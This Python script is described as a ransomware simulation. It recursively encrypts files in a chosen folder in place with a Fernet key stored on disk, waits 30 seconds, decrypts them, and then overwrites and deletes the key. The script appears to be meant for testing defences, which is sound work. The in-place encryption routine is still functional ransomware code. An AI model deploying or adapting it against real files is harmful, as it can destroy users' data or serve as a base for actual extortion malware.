import os
import time
import subprocess
import sys

# Function to install required libraries
def install_libraries():
    """
    Automatically installs the required libraries using pip.
    """
    required_libraries = ["cryptography"]
    for lib in required_libraries:
        try:
            __import__(lib)  # Check if the library is already installed
        except ImportError:
            print(f"{lib} is not installed. Installing...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib])

# Importing cryptography after installation
def import_libraries():
    global Fernet
    from cryptography.fernet import Fernet

def generate_key():
    """
    Generates a new encryption key and saves it to 'ransomware_key.key'.
    
    Returns:
        bytes: The generated encryption key.
    """
    key = Fernet.generate_key()
    with open('ransomware_key.key', 'wb') as key_file:
        key_file.write(key)
    return key

def load_key():
    """
    Loads the encryption key from 'ransomware_key.key'.
    
    Returns:
        bytes: The loaded encryption key.
    """
    return open('ransomware_key.key', 'rb').read()

def encrypt_files(folder_path, key, file_types):
    """
    Encrypts files in the specified folder using the provided encryption key.
    
    Args:
        folder_path (str): The path to the folder containing files to encrypt.
        key (bytes): The encryption key.
        file_types (list): List of file extensions to encrypt. If empty, encrypts all files.
    
    Returns:
        tuple: The number of encrypted files and the time taken for encryption.
    """
    fernet = Fernet(key)
    start_time = time.time()
    encrypted_files = 0
    for root, _, files in os.walk(folder_path):
        for filename in files:
            if file_types and not any(filename.endswith(ext) for ext in file_types):
                continue
            file_path = os.path.join(root, filename)
            try:
                with open(file_path, 'rb') as file:
                    file_data = file.read()
                encrypted_data = fernet.encrypt(file_data)
                with open(file_path, 'wb') as file:
                    file.write(encrypted_data)
                encrypted_files += 1
            except Exception as e:
                with open("error_log.txt", "a") as log_file:
                    log_file.write(f"Error encrypting {file_path}: {e}\n")
    time_taken = time.time() - start_time
    return encrypted_files, time_taken

def decrypt_files(folder_path, key):
    """
    Decrypts files in the specified folder using the provided encryption key.
    
    Args:
        folder_path (str): The path to the folder containing files to decrypt.
        key (bytes): The encryption key.
    
    Returns:
        tuple: The number of decrypted files and the time taken for decryption.
    """
    fernet = Fernet(key)
    start_time = time.time()
    decrypted_files = 0
    for root, _, files in os.walk(folder_path):
        for filename in files:
            file_path = os.path.join(root, filename)
            try:
                with open(file_path, 'rb') as file:
                    file_data = file.read()
                decrypted_data = fernet.decrypt(file_data)
                with open(file_path, 'wb') as file:
                    file.write(decrypted_data)
                decrypted_files += 1
            except Exception as e:
                with open("error_log.txt", "a") as log_file:
                    log_file.write(f"Error decrypting {file_path}: {e}\n")
    time_taken = time.time() - start_time
    return decrypted_files, time_taken

def secure_delete_key():
    """
    Securely deletes the encryption key file by overwriting it with random data
    and then removing it.
    """
    try:
        with open('ransomware_key.key', 'r+b') as key_file:
            key_file.write(os.urandom(os.path.getsize('ransomware_key.key')))
        os.remove('ransomware_key.key')
    except Exception as e:
        print(f"Error securely deleting key file: {e}")

def main():
    """
    Main function to run the ransomware simulation script. Prompts user for folder
    path, encryption options, and performs encryption and decryption.
    """
    # Install required libraries if needed
    install_libraries()
    import_libraries()

    # Prompt user for folder path
    folder_path = input("Enter the path to the folder to simulate attack: ").strip()
    if not os.path.isdir(folder_path):
        print(f"Invalid folder path: {folder_path}")
        return

    # Prompt user for encryption option
    all_files_option = input("Do you want to encrypt all files? (yes/no): ").strip().lower()
    if all_files_option == "yes":
        file_types = []
    else:
        # Prompt user for file types
        file_types_input = input("Enter file types to encrypt (e.g., .txt .jpg), or press Enter to skip: ").strip()
        file_types = file_types_input.split() if file_types_input else []

    key = generate_key()

    print("Starting encryption...")
    encrypted_files, encrypt_time = encrypt_files(folder_path, key, file_types)
    print(f"Encryption completed: {encrypted_files} files encrypted in {encrypt_time:.2f} seconds")

    # Wait for 30 seconds
    print("Waiting for 30 seconds before decryption...")
    time.sleep(30)

    print("Starting decryption...")
    decrypted_files, decrypt_time = decrypt_files(folder_path, key)
    print(f"Decryption completed: {decrypted_files} files decrypted in {decrypt_time:.2f} seconds")

    # Securely delete the key file
    secure_delete_key()
    print("Encryption key securely deleted.")

if __name__ == "__main__":
    main()
